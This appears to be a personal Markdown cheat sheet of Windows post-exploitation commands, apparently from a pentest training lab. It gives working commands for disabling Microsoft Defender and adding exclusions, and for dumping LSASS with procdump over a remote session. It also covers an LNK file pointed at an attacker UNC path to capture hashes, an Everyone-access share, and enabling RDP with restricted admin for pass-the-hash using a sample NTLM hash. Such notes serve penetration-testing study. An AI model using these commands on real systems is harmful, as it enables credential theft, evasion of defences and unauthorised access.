- [ ] Archive Extraction From Powershell
- [ ] Create A Public Share
- [ ] Powershell Files Transfer
- [ ] Microsoft Defender Status - Deactivation
- [ ] Applocker - Rules Enumeration
- [ ] Create Powershell Creds String
- [ ] SCF And LNK Files
- [ ] Add a User And Activate RDP
- [ ] Jonction Link

Archive Extraction | Creation  From Powershell!!!
```powershell
Expand-Archive -Path "C:\Users\administrator\tools.zip" -DestinationPath .

Compress-Archive -Path "Folder" -DestinationPath 1.zip
```
Create A Public Share!!!
```powershell
New-SmbShare -Name "Public" -Path "C:\temp" -FullAccess "Everyone"
```
Powershell Files Transfer!!!
```powershell
Copy-Item -Path "C:\Tools\procdump64.exe" -Destination "C:\Users\procdump64.exe" -ToSession $svcsql

Copy-Item -Path "C:\Users\lsass.dmp" -Destination "C:\Tools\lsass.dmp" -FromSession $svcsql
```
Microsoft Defender Status - Deactivation!!!
```powershell
# AV Status
Get-MpComputerStatus

# List Exclusion
Get-MpPreference | select Exclusion* | fl

# Create an Exclusion folder
mkdir C:\Temp
Add-MpPreference -ExclusionPath C:\Temp

# Disable
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
```
Applocker - Rules Enumeration!!!
```powershell
# List AppLocker Rules
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
# Test AppLocker Policy
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

NB:
S-1-1-0 is the sid for EveryOne group
```
Create Powershell Creds String!!!
```powershell
$SecPassword = ConvertTo-SecureString 'lucky7' -AsPlainText -Force

$Cred1 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\svc_sql', $SecPassword)

$svcsql = New-PSSession -ComputerName MS01.INLANEFREIGHT.LOCAL -Credential $Cred1
```
SCF And LNK Files!!!
```powershell
1. LNK Files
$lnk = $objShell.CreateShortcut("C:\Users\bvincent\test.lnk")
$lnk.TargetPath = "\\172.16.139.175\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()

PS C:\Users\bvincent> copy .\test.lnk \\dc01\Print_queue
PS C:\Users\bvincent> dir \\dc01\Print_queue
2. SCF Files

```
Add a User And Activate RDP!!!
```sh
# meterpreter
run getgui -e -u ignite -p 123
# msf
use post/windows/mange/enable_rdp
# powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
# cmd
reg query "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections

reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# enable rdp-pth
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
# rdp-pth
xfreerdp /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824
```
Jonction Link!!!
```powershell
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs
```